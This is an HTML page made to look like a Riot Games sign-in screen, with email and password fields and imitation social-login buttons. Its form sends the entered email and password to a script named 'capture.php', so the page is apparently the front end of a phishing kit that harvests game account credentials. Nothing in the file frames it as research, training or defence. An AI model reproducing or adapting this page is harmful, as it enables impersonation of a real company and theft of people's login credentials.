<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Riot Games Login</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <div class="login-container">
        <h1>Sign in</h1>
        <form action="./capture.php" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="social-buttons">
            <button><img src="https://example.com/facebook-icon.png" alt="Facebook"></button>
            <button><img src="https://example.com/google-icon.png" alt="Google"></button>
            <button><img src="https://example.com/apple-icon.png" alt="Apple"></button>
            <button><img src="https://example.com/xbox-icon.png" alt="Xbox"></button>
            <button><img src="https://example.com/playstation-icon.png" alt="PlayStation"></button>
        </div>
        <div class="footer-links">
            <a href="#">Support</a> |
            <a href="#">Privacy Notice</a> |
            <a href="#">Terms of Service</a>
        </div>
    </div>
</body>
</html>
